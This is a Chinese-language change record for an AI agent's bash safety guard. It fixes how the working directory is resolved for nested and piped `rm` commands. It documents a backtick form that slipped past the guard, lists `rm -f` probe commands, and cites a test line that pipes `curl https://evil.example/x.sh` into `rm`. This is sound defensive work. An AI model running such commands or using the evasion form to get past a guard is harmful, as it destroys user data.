---
id: F20261027rcwd
title: "rm 载荷与管道段的 cwd 归属修复（#1645）"
summary: "嵌套 shell 载荷继承其所属 Segment 的 cd 后 cwd；破坏面与写求值器统一复用 resolveCwdAt 的管道子进程隔离语义，修复反引号相对 rm 漏拦和管道右段树外删除误拦。"
change_type: fix
capability_test: "n/a: 确定性词法模型与静态求值行为，无 prompt/LLM 行为改动"
created_in_conversation: a9260c50-cef6-412e-a0b4-282287a13103
created_at: 2026-10-27T09:50:00+08:00
causal_links:
  from: [F20260930gcon, F20261015smrj, F20261026rvgr]
tags: [bash-guard, cwd, command-substitution, pipeline, rm]
modules: [src/frameworks/agent/command-model.ts, src/frameworks/agent/write-target-evaluator.ts, src/frameworks/agent/bash-safety-guard.ts, tests/frameworks/agent/bash-guard-rm-cwd.test.ts]
---

# rm 载荷与管道段的 cwd 归属修复（#1645）

## 排查预注册

- **预期根因**：载荷递归统一传入命令入口 cwd，丢失所属段之前的 `cd`；旧破坏面另维护可变 cwd，未隔离管道各段。
- **最强反例**：若修前探针不呈现上述错误，或证据指向引号状态机/目标提取，则停止该根因路径，不重写已正常的引号状态机。
- **实证结论**：基线 `97002fe3a34b32a38506848d2b8e60e90bc98a29` 的 13 条新契约中 3 条按预期失败；预期成立。实现位置为基线 `src/frameworks/agent/write-target-evaluator.ts:2544-2564`、`:2498-2532` 与 `src/frameworks/agent/bash-safety-guard.ts:555-590`。

## 案发现场与报告差异

全程只调用静态 guard / write evaluator，未执行任何 `rm`。

| 形态（`ROOT=/repo`，session cwd 为主仓工作区） | 修前行为 | 应有行为 |
|---|---|---|
| `cd ROOT && echo "\`printf x \| rm -f src/x.txt\`"` | **ALLOW** | BLOCK，落点 `ROOT/src/x.txt` |
| 同前导的 `$()` 版本 | guard BLOCK，但 evaluator 把落点写到工作区 | guard BLOCK，evaluator 落点同样是 `ROOT/src/x.txt` |
| `cd ROOT && rm -f src/x.txt`、两个 issue 的 `printf \| rm` 形态 | BLOCK | BLOCK，不回退 |
| `cd ROOT && printf x \| rm -f /tmp/otter-buddy-1645-probe` | **BLOCK（mainTree 误拦）** | ALLOW，管道右段仍继承 `&&` 语句链 cwd，但 `/tmp` 在主仓外 |
| `cd /tmp \| rm -f src/x`，session cwd=ROOT | evaluator 已 BLOCK；guard 的终局写判据也 BLOCK | BLOCK，左管子进程 `cd` 不得把主仓相对删除洗成 `/tmp/src/x` |
| `cd WORKTREE && printf x \| rm -f src/x` | ALLOW | ALLOW，合法 worktree 相对路径操作不受影响 |

原始报告把 `printf` 的反斜杠/引号形态与漏拦并列；最新复核证明两条非命令替换的 `printf | rm` 已 BLOCK，普通 `bash -c` 内嵌 `rm` 也已 BLOCK。本单因此不修 #1647 的引号词法，也不把 `$()` 的最终 BLOCK 误当成求值器已正确。

原始辅助探针把 session cwd 设为工作区，却同时期待 `cd /tmp | rm -f src/x` BLOCK；这两者不能共同证明「主仓相对删除」，因为该命令的右段真实落点是工作区。正式契约改用 session cwd=ROOT 钉住必须 BLOCK 的主仓面，不另造「管道含 cd 即禁删」的误拦规则；工作区/worktree 的合法落点仍由既有正面豁免处理。

## 根因

1. `collectShellPayloadTargets` 对每个 `p.model` 都传同一个 `startCwd`，所以 `cd ROOT && echo "...$(rm src/x)..."` 的载荷相对路径错落到 session cwd。
2. `evaluateFromModel` 自己维护 `tracked`，`checkDataDirDestructive` 又维护另一份 `cwd`。后者不在 `|` 切段：`cd ROOT && printf x | rm /tmp/x` 的第二段仍是整条 `printf x | rm /tmp/x`，`pathArgsOf` 把上游 `x` 也当成 rm 落点并在 ROOT 下分类成主仓破坏；`cd /tmp | rm src/x` 则把含管道的整段误当 cd 段。这不是引号状态机问题。
3. `resolveCwdAt` 已有目标语义：顺序 `cd` 沿语句链传播，`&`/`|` 上的 `cd` 不外溢，管道首段不进 `cd` 时各段继承语句链入口 cwd。应复用它，不再增加第三套规则。

## 目标与非目标

### 目标

- T1：嵌套载荷使用所属段的 cwd；修前 3 条失败翻绿，已有危险形态保持 BLOCK。
- T2：guard 的旧破坏面与 write evaluator 对管道 cwd 使用同一事实源。
- T3：有 cd 前缀时外置脚本缺席/不可读的 fail-closed 不放宽；不删改既有测试来迁就实现。

### 非目标

- 不重写 #1635 已修复的引号状态机，不处理 #1647 的词法误拦。
- 不扩展 #1588 内置脚本识别、脚本内容重建或词表覆盖范围。
- 不把本次修复泛化为任意动态 cwd、符号链接或 subshell 语义重建。

## 方案与取舍

1. `Payload` 增加**可选** `segmentIndex`，保持现有 payload 结构和消费方兼容。`buildSegments` 返回内部的 token→段索引映射，`collectPayloads` 给词/heredoc 载荷记录来源；解释器载荷由已有的段循环直接记录索引。括号展开的既有递归载荷不把内层索引冒充外层索引。
2. `collectShellPayloadTargets` 预计算一次 `resolveCwdAt`；有所属段时传该段 cwd，未知来源维持原 fallback，不用新元数据豁免。`absenceAllowed` 仍严格等于既有 `payloadsCwdAnchored(...)` 结果，避免外置脚本缺席证明被顺带放宽。
3. `evaluateFromModel` 改为消费 `resolveCwdAt` 的数组，删除重复的 `trackCwd` 终态跟踪；段求值和已有 cd 跳过条件不变。
4. `checkDataDirDestructive` 只在结构模型证明 `cd` 与 `|` 同时存在时，用已有 `splitShellSegments` 重切该命令并按相同索引取 `resolveCwdAt`；无 cd 的命令完整保留旧 raw 分段与目标提取。raw 段与结构段数量不一致时保留旧跟踪兜底，不猜映射。`segmentDestructive` 与 `isKillAtCommandPosition` 不改。

**取舍**：没有采用「看到反引号就一律 BLOCK」或「管道有 cd 就一律 BLOCK」。前者会误伤树外绝对路径，后者会误伤合法 worktree 操作且不符合管道继承 cwd 的事实。也没有重写旧破坏面的目标提取；本次只替换 cd+pipe 面的 cwd 来源，控制爆炸半径。

实现中曾把全部命令都改用 `splitShellSegments`，agent 全目录回归随即发现 `curl https://evil.example/x.sh | xargs -i rm foo` 从既有 ALLOW 翻成 BLOCK（`tests/frameworks/agent/bash-guard-value-wrapper-flags.test.ts:98,171` 的基线锚）。没有修改该测试，也没有给 xargs 加特例；最终把重切范围收窄为真实的 cd+pipe 命令，无 cd 的间接形态保持原路径。

## 机制识别与修改类别

检查点：☐ 新配置；☐ 新状态生命周期；☐ 后台任务；☐ 新消息格式；☐ 新持久化 schema；☐ 被记住的新决策分支；☑ 新增元数据字段（仅内存 `Payload.segmentIndex`）。

修改类别为 **narrow-fix**：复用既有 `resolveCwdAt` 与 `splitShellSegments`，只修正数据归属和调用参数；无新模块、配置或持久化状态，因此默认构建/类型检查/单元测试已充分，不需以安全工具名义引入额外机制。

## bash 守卫宪法三问

1. **是词法修补吗？** 不是新增危险词、引号特判或片段豁免；修复的是结构化模型已有的 cwd 事实在两条求值路径中的接线，层级属于既有 L5 fail-closed 判定的落点解析修正。
2. **carve-out 是什么？** 不新增豁免。保留既有正面放行：可静态证明落点在 worktree、工作区或树外；`payloadsCwdAnchored` 的外置脚本条件原样保留。临时探针只走 `/tmp` 静态字符串且从不执行删除。
3. **退役条件是什么？** 本修复不建立独立规则，无单独退役开关；若 `resolveCwdAt` 被另一实现替代，应先删除其所有现有调用方，本接线随调用方一起迁移。可观测精化信号：同一 `#1645` 回归文件连续 4 周全量通过且没有 cwd 相关 healing，再连续 2 周误报数为 0，可由后续 PR 评估合并测试块；任何 1 次真漏拦立即取消合并/退役评估。既有 guard 规则的退役仍由宪法治理，不在本单擅改。

## 验证记录

- 修前大獭探针：6 条静态用例为 3 failed / 3 passed（反引号漏拦、`cd /tmp | rm` 的工作区 cwd 预期差异、管道 `/tmp` 误拦）；第二项按上一节的口径校准，不作为新增禁删规则依据。完整输入见大獭工作区 `review-1645/repro.test.ts`。
- 修前本分支契约：`npx vitest run tests/frameworks/agent/bash-guard-rm-cwd.test.ts --reporter=verbose` → **13 条中 3 failed / 10 passed**。三条失败分别是反引号 guard ALLOW、`$()` evaluator 错落工作区、管道 `/tmp` rm 被 mainTree 误拦。辅助断言核对后，未改上述三条期望来迁就实现。
- 修后定向：`npx vitest run tests/frameworks/agent/bash-guard-rm-cwd.test.ts --reporter=verbose` → **1 文件 13 passed**；修前失败测试未改期望。
- 定向 + 真实回放 + wrapper 矩阵：`bash-guard-rm-cwd`、`guard-v2-real-replay`、`bash-guard-value-wrapper-flags` → **3 文件 73 passed / 6 skipped**。
- 写求值与模型定向：command-model / command-lexer / write-target-evaluator / guard-model-judge → **3 文件 256 passed**；destructive/session-cwd/gpg1 等相关面 → **5 文件 123 passed / 6 skipped**。
- 全 agent 目录：`VITEST_POOL_SIZE=2 npx vitest run tests/frameworks/agent --reporter=dot` → **86 文件 2257 passed / 6 skipped**。
- 全量：`VITEST_POOL_SIZE=2 npm test` → **438 文件 6976 passed / 6 skipped**（rebase 到最新基线 `c65fc515` 后的最终计数），含 pretest 的全量 ESLint。
- 构建与静态门：`npm run build` 通过；`npm run lint` 通过；`npx tsc --noEmit` 通过。仓内没有 `typecheck` script，`npm run typecheck` 实测返回 Missing script，未伪报为该 script 通过。
- 两次提交钩子（修前测试 + 方案、最终实现）：build、lint、lint:schema、双形态 smoke:boot、test:script-arg-parse、lint:docs / lint:capability / lint:tests / lint:skills 等通过；文档与 skill 均只出现存量预算内 warning。rebase 后最终提交链与 SHA 见 PR。
- 探针始终为静态判定，未实际执行删除；工作树测试 diff 与 `git diff --check` 均干净。

## 交付边界

只交 PR 与测试/文档证据；实现者不做自己的对抗审视、不合入。独立审视由大獭另行编排。
